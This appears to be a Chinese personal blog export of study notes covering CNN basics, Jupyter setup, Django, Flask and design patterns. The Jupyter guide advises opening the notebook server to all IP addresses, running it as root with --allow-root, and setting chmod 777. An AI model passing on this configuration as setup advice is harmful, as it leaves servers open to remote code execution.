超参数的验证超参数（hyper-parameter）这里所说的超参数是指，比如各层的神经元数量、batch 大小、参数更新时的学习率或权值衰减等。如果这些超参数没有设置合适的值，模型的性能就会很差。 验证数据用测试数据确认超参数的值的“好坏”，就会导致超参数的值被调整为只拟合测试数据。 根据不同的数据集，有的会事先分成训练数据、验证数据、测试数据三部分，有的只分成训练数据和测试数据两部分，有的则不进行分割。 超参数的最优化进行超参数的最优化时，逐渐缩小超参数的“好值”的存在范围非常重要。所谓逐渐缩小范围，是指一开始先大致设定一个范围，从这个范围中随机选出一个超参数（采样），用这个采样到的值进行识别精度的评估；然后，多次重复该操作，观察识别精度的结果，根据这个结果缩小超参数的“好值”的范围。通过重复这一操作，就可以逐渐确定超参数的合适范围。 超参数的最优化的步骤步骤 0 设定超参数的范围。 步骤 1 从设定的超参数范围中随机采样。 步骤 2 使用步骤 1 中采样到的超参数的值进行学习，通过验证数据评估识别精度（但是要将 epoch 设置得很小）。 步骤 3 重复步骤 1 和步骤 2（100 次等），根据它们的识别精度的结果，缩小超参数的范围。 day10 CNN结构卡1整体结构CNN : 和之前介绍的神经网络一样，可以像乐高积木一样通过组装层来构建。不过，CNN 中新出现了卷积层（Convolution 层）和池化层（Pooling 层）。 全连接（fully-connected）: 相邻层的所有神经元之间都有连接。 基于全连接层（Affine 层）的网络的例子： CNN 的一个例子: CNN 的层的连接顺序是“Convolution - ReLU -（Pooling）”（Pooling 层有时会被省略）。 卷积层全连接层存在的问题CNN 中，有时将卷积层的输入输出数据称为特征图（feature map）。其中，卷积层的输入数据称为输入特征图（input feature map），输出数据称为输出特征图（output feature map）。 全连接层存在什么问题呢？那就是数据的形状被“忽视”了。比如，输入数据是图像时，图像通常是高、长、通道方向上的 3 维形状。但是，向全连接层输入时，需要将 3 维数据拉平为 1 维数据。 在 CNN 中，可以（有可能）正确理解图像等具有形状的数据。 卷积运算乘积累加运算： 填充“幅度为 1 的填充”是指用幅度为 1 像素的 0 填充周围(图中用虚线表示填充，并省略了填充的内容“0”): 为什么使用填充： 因为如果每次进行卷积运算都会缩小空间，那么在某个时刻输出大小就有可能变为 1，导致无法再应用卷积运算。填充后卷积运算就可以在保持空间大小不变的情况下将数据传给下一层。 步幅 计算： 假设输入大小为 (H, W)，滤波器大小为 (FH, FW)，输出大小为 (OH, OW)，填充为 P，步幅为 S。 3 维数据的卷积运算 在 3 维数据的卷积运算中，输入数据和滤波器的通道数要设为相同的值,滤波器大小可以设定为任意值（不过，每个通道的滤波器大小要全部相同）。 结合方块思考通道数为 C、高度为 H、长度为 W 的数据的形状可以写成（C, H, W）。滤波器也一样，要按（channel, height, width）的顺序书写。比如，通道数为 C、滤波器高度为 FH（Filter Height）、长度为 FW（Filter Width）时，可以写成（C, FH, FW）。 批处理神经网络的处理中进行了将输入数据打包的批处理。之前的全连接神经网络的实现也对应了批处理，通过批处理，能够实现处理的高效化和学习时对 mini-batch 的对应。 批处理将 N 次的处理汇总成了 1 次进行。 卷积运算也同样对应批处理，需要将在各层间传递的数据保存为 4 维数据。具体地讲，就是按 (batch_num, channel, height, width) 的顺序保存数据。 day11 CNN结构卡2池化层池化是缩小高、长方向上的空间的运算。 ps:除了 Max 池化之外，还有 Average 池化等。相对于 Max 池化是从目标区域中取出最大值，Average 池化则是计算目标区域的平均值。在图像识别领域，主要使用 Max 池化。 池化层的特征 没有要学习的参数 池化层和卷积层不同，没有要学习的参数。池化只是从目标区域中取最大值（或者平均值），所以不存在要学习的参数。 通道数不发生变化 经过池化运算，输入数据和输出数据的通道数不会发生变化。 对微小的位置变化具有鲁棒性（健壮） 输入数据发生微小偏差时，池化仍会返回相同的结果。因此，池化对输入数据的微小偏差具有鲁棒性。 卷积层和池化层的实现4 维数组CNN 中各层间传递的数据是 4 维数据。所谓 4 维数据，比如数据的形状是 (10, 1, 28, 28)，则它对应 10 个高为 28、长为 28、通道为 1 的数据。 基于 im2col 的展开im2col 是一个函数，将输入数据展开以适合滤波器（权重）。 ps:NumPy 中存在使用 for 语句后处理变慢的缺点（NumPy 中，访问元素时最好不要用 for 语句）。 卷积运算的滤波器处理的细节：将滤波器纵向展开为 1 列，并计算和 im2col 展开的数据的矩阵乘积，最后转换（reshape）为输出数据的大小: 卷积层的实现im2col 这一便捷函数具有以下接口。 123456im2col (input_data, filter_h, filter_w, stride=1, pad=0):input_data——由（数据量，通道，高，长）的 4 维数组构成的输入数据filter_h——滤波器的高filter_w——滤波器的长stride——步幅pad——填充 im2col 会考虑滤波器大小、步幅、填充，将输入数据展开为 2 维数组。 卷积层的初始化方法将滤波器（权重）、偏置、步幅、填充作为参数接收。滤波器是 (FN, C, FH, FW) 的 4 维形状。另外，FN、C、FH、FW 分别是 Filter Number（滤波器数量）、Channel、Filter Height、Filter Width 的缩写。 1reshape(FN,-1) 将参数指定为 -1，这是 reshape 的一个便利的功能。通过在 reshape 时指定为 -1，reshape 函数会自动计算 -1 维度上的元素个数，以使多维数组的元素个数前后一致。比如，(10, 3, 5, 5) 形状的数组的元素个数共有 750 个，指定 reshape(10,-1) 后，就会转换成 (10, 75) 形状的数组。 transpose 会更改多维数组的轴的顺序。基于 NumPy 的 transpose 的轴顺序的更改：通过指定索引（编号），更改轴的顺序: 池化层的实现池化的情况下，在通道方向上是独立的。 池化层的实现按下面 3 个阶段进行。 展开输入数据。 求各行的最大值。 转换为合适的输出大小。 day12 CNN实现卡CNN 的实现组合卷积层和池化层。 “Convolution - ReLU - Pooling -Affine - ReLU - Affine - Softmax”的网络。 CNN 可以有效读取图像中的某种特性，在手写数字识别中，还可以实现高精度的识别。 CNN 的可视化第 1 层权重的可视化卷积层的滤波器会提取边缘或斑块等原始信息。而刚才实现的 CNN 会将这些原始信息传递给后面的层。 学习前和学习后的第 1 层的卷积层的权重：虽然权重的元素是实数，但是在图像的显示上，统一将最小值显示为黑色（0），最大值显示为白色（255）。 学习前的滤波器是随机进行初始化的，所以在黑白的浓淡上没有规律可循，但学习后的滤波器变成了有规律的图像。有规律的滤波器在它在观察边缘（颜色变化的分界线）和斑块（局部的块状区域）等。 基于分层结构的信息提取一般物体识别（车或狗等）的 8 层 CNN。 ps：AlexNet 网络结构堆叠了多层卷积层和池化层，最后经过全连接层输出结果。 第 1 层的神经元对边缘或斑块有响应，第 3 层对纹理有响应，第 5 层对物体部件有响应，最后的全连接层对物体的类别（狗或车）有响应。 最开始的层对简单的边缘有响应，接下来的层对纹理有响应，再后面的层对更加复杂的物体部件有响应。也就是说，随着层次加深，神经元从简单的形状向“高级”信息变化。 具有代表性的 CNNCNN 元祖 LeNet；AlexNet。 LeNet AlexNetAlexNet 叠有多个卷积层和池化层，最后经由全连接层输出结果。 AlexNet 和 LeNet 差异 激活函数使用 ReLU。 使用进行局部正规化的 LRN（Local Response Normalization）层。 使用 Dropout（6.4.3 节）。 day13 深度学习加深网络深度学习的小历史VGGVGG 是由卷积层和池化层构成的基础的 CNN。它的特点在于将有权重的层（卷积层或者全连接层）叠加至 16 层（或者 19 层），具备了深度（根据层的深度，有时也称为“VGG16”或“VGG19”）。VGG 中需要注意的地方是，基于 3×3 的小型滤波器的卷积层的运算是连续进行的。重复进行“卷积层重叠 2 次到 4 次，再通过池化层将大小减半”的处理，最后经由全连接层输出结果。 GoogLeNetGoogLeNet 的特征是，网络不仅在纵向上有深度，在横向上也有深度（广度）。GoogLeNet 在横向上有“宽度”，这称为“Inception 结构”，Inception 结构使用了多个大小不同的滤波器（和池化），最后再合并它们的结果。GoogLeNet 的特征就是将这个 Inception 结构用作一个构件（构成元素）。在 GoogLeNet 中，很多地方都使用了大小为 1 × 1 的滤波器的卷积层。这个 1 × 1 的卷积运算通过在通道方向上减小大小，有助于减少参数和实现高速化处理。 ResNetResNet 是微软团队开发的网络。它的特征在于具有比以前的网络更深的结构。 在深度学习中，过度加深层的话，很多情况下学习将不能顺利进行，导致最终性能不佳。ResNet 中，为了解决这类问题，导入了“快捷结构”（也称为“捷径”或“小路”）。 不太明白。。。。。。。。。 深度学习的高速化GPU 分布式 ps：计算机中表示小数时，有 32 位的单精度浮点数和 64 位的双精度浮点数等格式。根据以往的实验结果，在深度学习中，即便是 16 位的半精度浮点数（half float），也可以顺利地进行学习。 NumPy 中提供了 16 位的半精度浮点数类型（不过，只有 16 位类型的存储，运算本身不用 16 位进行），即便使用 NumPy 的半精度浮点数，识别精度也不会下降。]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lua-查缺补漏]]></title>
    <url>%2FLua-%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F%2F</url>
    <content type="text"><![CDATA[Lua 是一种嵌入式开发语言，核心保持了短小精悍，你可以在 Redis、NGINX 中嵌入 Lua，来帮助你更灵活地完成业务逻辑。同时，Lua 也可以调用已有的 C 函数和数据结构，避免重复造轮子。]]></content>
      <categories>
        <category>Lua</category>
      </categories>
      <tags>
        <tag>小型组</tag>
        <tag>Lua</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-jupyter-使用总结]]></title>
    <url>%2Fpython-jupyter-%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[在 centos 下配置 jupyter配置文档jupyter notebook –generate-config 生成默认配置文档 修改密码：1. windows下，打开命令行，重新生成一个jupyter配置文件： jupyter notebook --generate-config 2. 修个配置文件，找到这个新生成的文件： 123456789101112Windows: C:\Users\USERNAME\.jupyter\jupyter_notebook_config.pylinux :vim /root/.jupyter/jupyter_notebook_config.py搜索 NotebookApp.allow_password_change，改为：NotebookApp.allow_password_change=False ，记得去掉注释的#也不要搜索了，麻烦，直接再第一行加 3. 回到命令行，运行jupyter notebook password1234notebook passwordEnter password: #键入密码，不显示的Verify password: #再次重复键入密码[NotebookPasswordApp] Wrote hashed password to C:\Users\用户\.jupyter\jupyter_notebook_config.json #密码生成的一串sha1，写入到了这个文件，等下要把这串sha1，复制到第一个生成的配置文件中 4. 还差一步密码才可以生效使用，在第一个jupyter_notebook_config.py配置文件中找到“c.NotebookApp.password“，等于，刚生成的那个密码sha1，效果如下：去掉前面的”#“ c.NotebookApp.password = u&#39;sha1:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39; 5. 保险起见，把jupyter重启，之后，无论是更换浏览器还是Logout登陆，新密码都可以正常使用了。 访问是https123问题：Jupyter notebook 远程server打开时遇到 socket.gaierror: [Errno -2] Name or service not known这个问题主要是由于远程打开的时候，并没有allow_remote_access=True 反向代理设置问题 修改(直接在前几行添加）：1c.NotebookApp.ip=&apos;*&apos; # 允许所有ip访问 踩坑： 设置了反向代理，访问什么的没问题，但是链接不到解释服务器，打不开终端，各种修改无果！修改允许所有IP访问，然后设置301重定向，近似完美解决。 修改Jupyter工作目录c.NotebookApp.notebook_dir = &#39;想设置哪个就是哪个&#39; 启动命令：1jupyter notebook --config /root/.jupyter/jupyter_notebook_config.py --allow-root 启动以后，还可以给Python环境安装包之类。如果希望Jupyter长久运行，可以使用nohup后台运行。 杀死占用端口程序进程根据端口查看这个进程的pidnetstat -lnp|grep 8080 #8080请换为你的apache需要的端口查看进程的详细信息ps 1777 #1777就是上一步得到的pid杀掉进程例如： kill -9 [PID] #-9 表示强迫进程立即停止 参考地址 修改jupyter的权限当我们用命令行在浏览器中启动jupyter notebook后需要点击右上角的New创建新的python文件，此时会报错。在Linux下可以用命令行解决这个问题。首先需要找到anaconda2中jupyter文件，在anaconda2中的share文件中，对jupyter执行如下命令，来修改jupyter的权限： chmod +777 /root/.jupyter/practice 之后重启jupyter即可运行,python代码 jupyter 快捷键Jupyter Notebook 快捷键 jupyter notebook 写代码自动补全1.安装nbextensions12pip install jupyter_contrib_nbextensions -i https://pypi.mirrors.ustc.edu.cn/simplejupyter contrib nbextension install --user 2.安装nbextensions_configurator12pip install --user jupyter_nbextensions_configurator jupyter nbextensions_configurator enable --user 如果提示缺少依赖，就使用pip安装对应依赖即可。 重启jupyter，在弹出的主页面里，能看到增加了一个Nbextensions标签页，在这个页面里，勾选Hinterland即启用了代码自动补全,然后重启大功告成。 Jupyter Notebook 超实用的 5 个插件 出现的问题如果出现错误如下：123456789Installing collected packages: msgpackCould not install packages due to an EnvironmentError: [WinError 5] 拒绝访问。:&apos;E:\\JiangHeSong\\Anaconda35.2.0\\Lib\\site-packages\\msgpack\\_packer.cp36-win_amd64.pyd&apos;Consider using the `--user` option or check the permissions. You are using pip version 10.0.1, however version 18.0 is available.You should consider upgrading via the &apos;python -m pip install --upgrade pip&apos; command. 只需要加一个–user 例如： pip install --user msgpack -i https://pypi.mirrors.ustc.edu.cn/simple 在Jupyter Notebook中交互式运行C++代码编译安装（坑货）参考：为什么是坑货呢？Jupyternotebook添加c++核心支持的配置过程(新浪blog) Jupyter Notebook 支持非常多的编程语言，而且可以直接运行这些语言的代码。要让 Jupyter Notebook 能够运行特定语言的代码，需要添加对应的内核。具体支持的语言及内核可以查看该链接： https://github.com/jupyter/jupyter/wiki/Jupyter-kernels 。 cling 内核依赖于 Python3 添加 C++ cling 内核 克隆 cling 的 Github 官方仓库： git clone https://github.com/root-project/cling.git 在进行编译操作之前，首先要确保你的机器上已经装好了 cmake 工具，即能够直接通过输入命令 cmake执行程序。 如果 cmake已经正确安装，就可以进行以下的操作了。 切换到 cling/tools/packaging/ 目录下，执行以下两条命令：12chmod +x cpt.py ./cpt.py --check-requirements &amp;&amp; ./cpt.py --create-dev-env Debug --with-workdir=./cling-build/ 这个过程包含了从网络上获取源文件以及编译，是最为耗时的一个阶段，以小时计。 编译完成后，需要在 python3 中安装 clingkernel。切换到 cling/tools/Jupyter/ 目录下，执行 pip3 install kernel/ 最后一步，往 Jupyter Notebook 中添加 cling 内核，可以根据自己的需要安装特定 C++ 规范的 cling 内核，例如 cling-cpp11, cling-cpp14, cling-cpp17。 jupyter kernelspec install kernel/cling-cpp17 如果没有其他问题，此时就可以打开 Jupyter Notebook 感受不一样的 C++ 编程了！官方代码示例123456789101112131415161718192021class Rectangle &#123; private: double w; double h; public: Rectangle(double w_, double h_) &#123; w = w_; h = h_; &#125; double area(void) &#123; return w * h; &#125; double perimiter(void) &#123; return 2 * (w + h); &#125;&#125;;Rectangle r = Rectangle(5, 4); r.area(); 输出为：12cpp(double) 20.000000 快速安装一、 安装Xeus-Cling 目前已支持Mac和Ubuntu，windows自测，推荐使用conda安装。 1.首先创建一个conda environment并激活(如果不会在虚拟环境中打开jupyter,可在base环境中安装）12conda create -n Xeus-Clingsource activate Xeus-Cling 然后使用conda package installer安装Xeus-Cling 1conda install -c conda-forge xeus-cling 完成！二、测试C++ Kernel 1.首先，激活环境并打开jupyter-notebook12source activate Xeus-Clingjupyter-notebook 安装的 C++ 内核 11 14 17 区别c++11/14/17标准你了解多少(CSDN)官方(微软、英语)#featurelist) Conda使用手册Conda使用手册(CSDN) 清华大学开源软件镜像站 科大源镜像站 jupyter 云平台binder C++ jupyter 只下载github的某个文件夹很多时候我们只想下载某个文件夹，而不是整个目录 我们可以用svn，先安装123apt install subversionyum install subversion 比如你要下载这个https://github.com/QuantStack/xeus-cling/tree/master/notebooks，将/tree/master/换成/trunk/即可1svn checkout https://github.com/QuantStack/xeus-cling/trunk/notebooks 奇技淫巧1、Jupyter常用的快捷键 1）代码运行键 如需运行一个cell（代码框）内的Python代码，可以选择Ctrl + Enter组合键，也可以选择Shift + Enter组合键。两者的区别在于前者在运行完代码后不会新增cell，而后者会新增cell或跳转到下一个cell。 2）自动补齐键 在代码编写过程中，如果只记得函数或变量名称的前几个字母，可以通过Tab键，实现全名称（如函数名、方法名、变量名等）的自动补齐。 3）帮助查询键 Python中有庞大的第三方包，而每个包中又包含很多功能性的函数，在使用这些函数时，往往会忘记函数内参数的具体用法，此时可以在函数后面按入Shift+Tab组合键，查看对应的帮助文档，而且还可以多按几次“Tab”键，返回不同风格的帮助文档。 4）cell创建键 在command模式下，按下字母a键，则会在当前cell的上方新增一个cell，如果按下字母b键，则会在当前cell的下方新增一个cell。 5）cell删除键 在command模式下，连续按两次d字母键，就可以轻松删除当前cell。或者还有另一个方法，在command模式下，按一次字母x键也可以实现cell的删除。 6）注释添加/取消键 如需给代码行或代码块增加注释功能，可以使用“Ctrl+/”的组合键，对于代码块的注释需要先选中，在使用组合键。如果原始代码中没有注释符，按入该组合键则增加注释，否则将取消注释。 7）保存键 在编写代码时，最好养成良好的习惯，那就是编写代码便保存（尽管Jupyter默认会2分钟自动保存一次，但2分钟内万一出现一些意外，岂不是糟糕啦）。代码的保存可以在command模式下，按一次字母s键。 8）行号显示键 在其他编程环境中也许会显示代码行号，但是在Jupyter的默认情况下是没有代码行号的，如果期望一个cell中显示所有代码对于的行编号，可以在command模式下，按一次字母l键。 9）code与markdown间切换键 code指的是Jupyter环境下所进行的Python代码的编写，而markdown则是用于非代码的笔记内容的编写。两者之间是可以轻松切换的，在command模式下，按一次字母m便从code切换到markdowen模式；如果从command模式中，按一次字母y就可以从markdown模式切换到code模式。 2、Jupyter中的魔法函数 1）%pwd 该魔法函数用于显示Jupyter当前的工作空间。 2）%hist 该魔法函数用于显示当前Jupyter中，所有运行过的历史代码。 3）%who 该魔法函数用于显示当前Jupyter环境中的所有变量或名称。 4）%reset 该魔法函数用于删除当前Jupyter环境中的所有变量或名称。 5)%time 该魔法函数用于计算当前代码行的运行时长。 6)%timeit 该魔法函数用于计算当前代码行的平均运行时长（即在执行一个语句100000次(默认情况下)后，再给出运行最快3次的平均值。 7)%%timeit 该魔法函数用于计算当前cell的代码运行时长。 8）%matplotlib 该魔法函数用于显示绘图结果的风格，默认为%matplotlib inline，是直接将图片显示在浏览器中，如果希望图片单独生成，可以使用%matplotlib。 9）%load 该魔法函数用于加载本地Python文件或者网络中的Python文件，例如本地脚本文件的加载：%load xxx.py。 10）%run 该魔法函数用于运行本地或网络中的Python文件，例如本地脚本文件的运行：%load xxx.py。 其他连接jupyter notebook系列之 自定义主题、字体、字号等(WX)python开发者必备，史上最详细的 jupyter 教程(WX) 在 jupyter 里使用 C++(B站文章) Jupyter Notebook界面也可以如此炫酷？有人把Notebook玩出了新花样 十大至简规则！]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>jupyter</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-Django-HFNU_Small_Size网站设计]]></title>
    <url>%2Fpython-Django-HFNU-Small-Size%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[新建一个项目、配置环境略 生成一个程序 app略 设计博客模型文章标题文本类型 文章摘要文本类型 文章内容文本类型 : TextField 唯一 ID 标识int 数字类型（自增、主键）：IntegerField 发布日期日期类型 : DateTimeField 1234567891011121314151617models：class Article(models.Model): # 文章的唯一ID article_id = models.AutoField(primary_key=True) # 文章标题 title = models.TextField() # 文章的摘要 brief_content = models.TextField() # 文章的主要内容 content = models.TextField() # 文章的发布日期 publish_date = models.DateTimeField(auto_now=True) def __str__(self): #将 title 返回，一个后台命名 return self.title注意不要忘记将新建 app 注册到 setting 配置里面。 新增超级管理员python manage.py createsuperuser 设计数据返回函数]]></content>
      <categories>
        <category>小型组</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Django</tag>
        <tag>小型组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式学习计划]]></title>
    <url>%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%2F</url>
    <content type="text"><![CDATA[计划：每天 19：00 - 20：00 时间段内花费 30 min - 40 min 学习一个设计模式。 一个月完成。 学习内容： gitchat 白话设计模式 28 讲 什么是设计模式设计模式（Design Pattern）是一套被反复使用、多数人知晓的、无数工程师实践的代码设计经验的总结，它是面向对象思想的高度提炼和模板化，使用设计模式是为了让代码具有更高的可重用性，更好的灵活性和可拓展性，更易被人阅读和理解。 学习设计模式的先行条件熟悉一门面向对象语言、学会阅读 UML 图 UML 类图关系大全UML 类图关系（泛化 、继承、实现、依赖、关联、聚合、组合） 监听模式/观察者模式观察者模式是对象的行为模式，又叫发布 - 订阅（Publish/Subscribe）模式、模型 - 视图（Model/View）模式、源 - 监听器（Source/Listener）模式或从属者（Dependents）模式。当你看这些模式的时候，不要觉得陌生，它们就是观察者模式。 观察者模式一般是一种一对多的关系，可以有任意个（一个或多个）观察者对象同时监听某一个对象。监听的对象叫观察者（后面提到监听者，其实就指观察者，两者是等价的），被监听的对象叫被观察者（Observable，也叫主题 Subject）。被观察者对象在状态或内容发生变化时，会通知所有观察者对象，使它们能够做出相应的变化（如自动更新自己的信息）。 模型抽象思考类图设计模型说明设计要点在设计观察者模式的程序时要注意以下几点： 要明确谁是观察者谁是被观察者，只要明白谁是关注对象，问题也就明白了。一般观察者与被观察者之间是多对一的关系，一个被观察对象可以有多个监听对象 (观察者)。如一个编辑框，有鼠标点击的监听者，也有键盘的监听者，还有内容改变的监听者。 Observable 在发送广播通知的时候，无须指定具体的 Observer，Observer 可以自己决定是否要订阅 Subject 的通知。 被观察者至少需要有三个方法：添加监听者、移除监听者、通知 Observer 的方法；观察者至少要有一个方法：更新方法，更新当前的内容，作出相应的处理。 添加监听者、移除监听者在不同的模型称谓中可能会有不同命名，如观察者模型中一般，addObserver，removeObserver；在源 - 监听器（Source/Listener）模型中一般是 attach/detach，应用在桌面编程的窗口中，还可能是 attachWindow/detachWindow，或 Register/UnRegister。不要被名称迷糊了，不管他们是什么名称，其实功能都是一样的，就是添加 / 删除观察者。 推模型和拉模型观察者模式根据其侧重的功能还可以分为推模型和拉模型。 推模型： 被观察者对象向观察者推送主题的详细信息，不管观察者是否需要，推送的信息通常是主题对象的全部或部分数据。一般这种模型的实现中，会把被观察者对象中的全部或部分信息通过 update 的参数传递给观察者 [update (Object obj) ，通过 obj 参数传递]。 拉模型： 被观察者在通知观察者的时候，只传递少量信息。如果观察者需要更具体的信息，由观察者主动到被观察者对象中获取，相当于是观察者从被观察者对象中拉数据。一般这种模型的实现中，会把被观察者对象自身通过 update 方法传递给观察者 [update (Observable observable)，通过 observable 参数传递 ]，这样在观察者需要获取数据的时候，就可以通过这个引用来获取了。 应用场景1、对一个对象状态或数据的更新需要其他对象同步更新，或者一个对象的更新需要依赖另一个对象的更新； 2、对象仅需要将自己的更新通知给其他对象而不需要知道其他对象的细节，如消息推送。 适配器模式模型抽象思考类图设计作用：接口转换，将原有的接口（或方法）转换成另一种接口；用新的接口包装一个已有的类；匹配一个老的组件到一个新的接口。 设计要点思考设计类图适配器模式中主要三个角色，在设计适配器模式时要找到并区分这些角色： 目标（Target）： 即你期望的目标接口，要转换成的接口。源对象（Adaptee）： 即要被转换的角色，要把谁转换成目标角色。适配器（Adapter）： 适配器模式的核心角色，负责把源对象转换和包装成目标对象。 模型说明设计要点适配器模式中主要三个角色，在设计适配器模式时要找到并区分这些角色： 目标（Target）：即你期望的目标接口，要转换成的接口。 源对象（Adaptee）：即要被转换的角色，要把谁转换成目标角色。 适配器（Adapter）：适配器模式的核心角色，负责把源对象转换和包装成目标对象 优缺点 适配器模式的优点 可以让两个没有关联的类一起运行，起着中间转换的作用。提高了类的复用。灵活性好，不会破坏原有的系统。 适配器模式的缺点 如果原有系统没有设计好（如 Target 不是抽象类或接口，而一个实体类），适配器模式将很难实现。过多地使用适配器，容易使代码结构混乱，如明明看到调用的是 A 接口，内部调用的却是 B 接口的实现。 应用场景1、系统需要使用现有的类，而这些类的接口不符合现有系统的要求。 2、对已有的系统拓展新功能时，尤其适用于在设计良好的系统框架下增加接入第三方的接口或第三方的 SDK 时。 状态模式模型抽象思考代码框架与类图模型说明1、在状态模式实现的时候，实现的场景状态有时候会非常复杂。决定状态变化的因素也会非常多，这个时候我们可以把决定状态变化的属性单独抽象成一个类 StateInfo，这样判断状态属性是否符合当前的状态 isMatch 时就可以传入更多的信息。 2、每一种状态应当只有唯一的一个实例。 应用场景1、一个对象的行为取决于它的状态，并且它在运行时可能经常改变它的状态从而改变它的行为。 2、一个操作中含有庞大的多分支的条件语句，且这些分支依赖于该对象的状态，且每一个分支的业务逻辑非常复杂时，我们可以使用状态模式来拆分他不同分支逻辑，使程序有更好的可读性可维护性。 单例模式模型抽象代码框架1.重写new和init方法2.自定义metaclass的方法3.装饰器的方法 类图基于框架的实现应用场景1、你希望这个类只有一个且只能有一个实例； 2、项目中的一些全局管理类（Manager）可以用单例来实现。 职责模式模型抽象代码框架类图基于框架的实现模型说明设计要点在设计职责模式的程序时要注意以下几点： 请求者与请求内容：谁要发送请求？发送请求的对象称为请求者。请求的内容通过发送请求时的参数进行传递。 有哪些责任人：责任人是构成责任链的关键要素。请求的流动方向是链条中的线，而责任人则是链条上的结点，线和结点才构成了一条链条。 对责任人进行抽象：真实世界中的责任人会多种多样，纷繁复杂，会有不同的职责和功能；但他们也有一个共同的特征——都可以处理请求。所以需要对责任人进行抽象，使他们具有责任的可传递性。 责任人可自由组合：责任链上的责任人可以根据业务的具体逻辑进行自由的组合和排序。 优缺点 优点： 降低耦合度。它将请求的发送者和接受者解耦。简化了对象。使得对象不需要知道链的结构。增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任人。增加新的处理类很方便。 缺点： 不能保证请求一定被接收。系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。 应用场景有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。请求的处理具有明显的一层层传递关系。请求的处理流程和顺序需要程序运行时动态确定。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习计划]]></title>
    <url>%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%2F</url>
    <content type="text"><![CDATA[计划：每周五、周六 18：00 - 21：00 时间段内花 30 min - 40 min ，累计学习一个算法。 学习内容： 极客时间：数据结构与算法之美gitchat：算法应该怎么玩 Dijkstra 算法一入算法深似海，太深了。。。]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-Flask框架-鱼书网站实践]]></title>
    <url>%2Fpython-Flask%E6%A1%86%E6%9E%B6-%E9%B1%BC%E4%B9%A6%E7%BD%91%E7%AB%99%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[Flask Fish 鱼书项目确定访问的 url 路径问题 无非就是 url 使用时是否在地址最后加上 斜杠 。 监听代码修改，热启动开启Flask 调试模式 python fisher.py 注册路由：1、用装饰器来注册路由。 2、app.add_url_rule 12345#@app.route（&quot;/hel1o&apos;）def hel1o（）：#基于类的视图（即插视图）return&apos;Hel1o，QiYue&apos;app.add_url_rule（&quot;/hello&apos;，view_func=hel1o）app.run（debug=True） 配置 pycharm 全局访问路径、端口app.run(host=&#39;0.0.0.0&#39;, debug=True,port=81) 部署的话该怎么处理debug 简单修改的不是太好，调试模式下使用的是默认的Flask自带的服务器，性能不太好，以及后端出现错误的话，网页端会显示出来。 方法： 加一个 config.py 的配置文件1234567891011121314fish.pyfrom flask import Flask author=&apos;七月o a@p=Flask（_name__）app.config.from_object（&apos;config&apos;）@app.route（&quot;/hello&apos;s def hello（）：#基于类的视图（即插视图）return&apos;Hello，QiYue&apos;#字典dict子类#app.add_urlrule（&quot;/hello&apos;，view_func=hel1o）app.run（host=&apos;0.0.e.e&apos;，debug=app.config[&apos;DEBUG&apos;]，port=81）config.py__author_=&apos;七月&apos;DEBUG = True 注意 config.py 无论是在配置里面还是在应用里面导入，都需要将参数全部大写。 真正理解 if name == ‘main‘:12if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;, debug=True) 在实际生产环境中需要 nginx+uwsgi 来搭配使用作为服务器。 作用：不会在实际生产环境中同时启用 nignx 和 flask 自带的服务器。 搜索功能的实现区分数字：按照数字进行搜索 区别书名：识别传入的是书名，对书名进行搜索1234567891011def is_isbn_or_key(word): isbn_or_key = &apos;key&apos; if len(word) == 13 and word.isdigit(): isbn_or_key = &apos;isbn&apos; short_q = word.replace(&apos;-&apos;, &apos;&apos;) if &apos;-&apos; in word and len(short_q) == 10 and short_q.isdigit: # 条件判断的原则，提高代码的运行效率 # 先把很大概率出现假的 条件放在前面 # 把查询数据库这种非常耗时的消耗放在后面 isbn_or_key = &apos;isbn&apos; return isbn_or_key 使用 API如何调用 api ：如何设计 api ：12345678910111213141516171819202122class YuShuBook: isbn_url = &apos;http://t.yushu.im/v2/book/isbn/&#123;&#125;&apos; keyword_ur1 = &apos;http://t.yushu.im/v2/book/search?q=&#123;&#125;&amp;count=&#123;&#125;&amp;start=&#123;&#125;&apos; # &#123;&#125; 代表动态数据 @classmethod def search_by_isbn(cls, isbn): url = cls.isbn_url.format(isbn) # url = self.isbn_url # 链式查找 result = HTTP.get(url) return result @classmethod def search_by_keyword(cls, keyword, page=1): print(1) url = cls.keyword_ur1.format(keyword, current_app.config[&apos;PER_PAGE&apos;], cls.calculate_start(page)) result = HTTP.get(url) return result @staticmethod def calculate_start(page): return (page - 1) * current_app.config[&apos;PER_PAGE&apos;] 三元表达式123456789101112131415161718在Python中的三元表达式的写法和大部分的语言是不同的现在有 x, y，如果 x大于y的话返回x否则返回y绝大部分语言中的写法：条件判断 ? 条件为真时返回的结果 : 条件为假时返回的结果x &gt; y ? x : y1Python中的写法先看一个伪代码：条件为真时返回的结果 if 条件判断 else 条件为假时的返回结果x =1y =2r = x if x &gt; y else y---------------------输出：2 